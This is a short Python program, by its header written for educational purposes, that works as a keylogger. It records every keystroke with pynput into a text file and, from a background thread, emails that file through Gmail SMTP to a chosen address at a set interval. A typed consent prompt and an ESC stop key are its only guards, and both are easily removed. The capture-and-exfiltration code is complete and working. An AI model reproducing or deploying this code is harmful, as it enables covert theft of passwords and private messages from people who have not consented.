# Jacob Beason
# Created - 12/9/25
# Last Modified - 12/9/25
# This program asks the user for consent to begin logging, logs keystrokes using the pynput lib and saves them to a txt file, then using SMTP, sends the file to an email address on a desired interval.
# This program was created for solely educational purposes to gain a deeper understanding of how keylogging could be used to take advantage of vunerable systems and how SMTP can be automated.

import smtplib
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import time 
import threading


def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, file_path, smtp_server="smtp.gmail.com", smtp_port=587):
    
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    
    # Attach the body text
    msg.attach(MIMEText(body, 'plain'))
    
    # Open and attach the file
    try:
        with open(file_path, 'rb') as attachment:
            # Create MIMEBase object
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        # Encode file in base64
        encoders.encode_base64(part)
        
        # Adds header with filename
        filename = os.path.basename(file_path)
        part.add_header('Content-Disposition', f'attachment; filename= {filename}')
        
        # Attaches the file to the message
        msg.attach(part)
        
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found")
        return False
    except Exception as e:
        print(f"Error attaching file: {e}")
        return False
    
    # Send the email
    try:
        # Creates SMTP session
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Enable TLS encryption
        
        # Login
        server.login(sender_email, sender_password)
        
        # Send email
        server.send_message(msg)
        server.quit()
        
        print(f"Email sent successfully to {recipient_email}")
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check your email and password.")
        return False
    except smtplib.SMTPException as ex:
        print(f"SMTP error occurred: {ex}")
        return False
    except Exception as ex:
        print(f"Error sending email: {ex}")
        return False


# Global flag to stop email loop
stop_email_loop = False

    
#Counts down desired time between emails  
def email_loop(seconds, sender_email, sender_password, recipient_email, subject, body, file_path):
    global stop_email_loop
    
    while not stop_email_loop:
        time.sleep(seconds)
        if not stop_email_loop:  # Check again after sleep
            send_email_with_attachment(sender_email=sender_email,sender_password=sender_password,recipient_email=recipient_email,subject=subject,body=body,file_path=file_path)
          


# Detects keystrokes and writes them to a txt file
def keyPressed(key):
    global stop_email_loop
    
    # Terminates script if esc is pressed
    if key == keyboard.Key.esc:
        print("\nKeylogging Terminated")
        stop_email_loop = True
        return False  # Stops the listener
        
    print(str(key))
    with open("keylog.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            # Handle special keys (space, enter, etc.)
            logKey.write(f' [{key}] ')


if __name__ == "__main__":

# Asks user for consent to begin logging 
    print("-" * 50)
    print("This program will record keyboard input and send logs via email.")
    print("\nDo you consent to this monitoring? (yes/no)")
    print("-" * 50)
    
# Terminates if consent is not given
    consent = input("> ").lower()
    if consent != "yes":
        print("Consent not given. Exiting.")
        exit()
    
    
    # User information
    SENDER_EMAIL = input("Sender Email - ")
    SENDER_PASSWORD = input("Sender Password (Use Gmail app password) - ") # Use Gmail app password
    RECIPIENT_EMAIL = input("Recipient Email - ")
    LOOP_LENGTH = int(input("Length of Email Loop in Seconds - "))
    
    # Email details
    subject = "keylog"
    body = "Keystroke log attached"
    file_path = os.path.join(os.path.dirname(__file__), "keylog.txt")
    
    # Start email loop in separate thread
    email_thread = threading.Thread(target=email_loop,args=(LOOP_LENGTH, SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_EMAIL, subject, body, file_path),
        daemon=True  # Thread will exit when main program exits
    )
    email_thread.start()
    
    # Start keyboard listener (runs in main thread)
    print("\nMonitoring started...")
    print("\nPress ESC to stop monitoring")

    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  # Wait until listener is stopped (ESC pressed)
    
    print("Waiting for final email to send...")
    time.sleep(2)  # Give time for any pending email to send
    print("Program terminated")
